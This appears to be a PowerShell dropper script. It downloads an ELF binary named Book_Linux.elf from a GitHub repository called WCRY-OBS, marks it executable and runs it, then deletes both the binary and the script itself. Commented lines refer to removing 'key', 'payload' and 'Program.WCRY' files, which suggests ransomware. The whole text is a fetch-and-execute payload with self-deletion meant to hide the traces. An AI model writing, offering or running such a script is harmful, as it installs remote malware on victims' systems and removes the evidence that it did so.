$url = 'https://github.com/bookbot2019/WCRY-OBS/raw/main/Book_Linux.elf'
$null = wget -q -Uri $url >$null
$scriptName = $MyInvocation.MyCommand.Name
$runAsProgram = "chmod +x Book_Linux.elf"
Invoke-Expression $runAsProgram
$script = "./Book_Linux.elf"
Invoke-Expression $script

Remove-Item "Book_Linux.elf"
Remove-Item $scriptName
# Remove-Item "key"
# Remove-Item "payload"
# Remove-Item "Program.WCRY"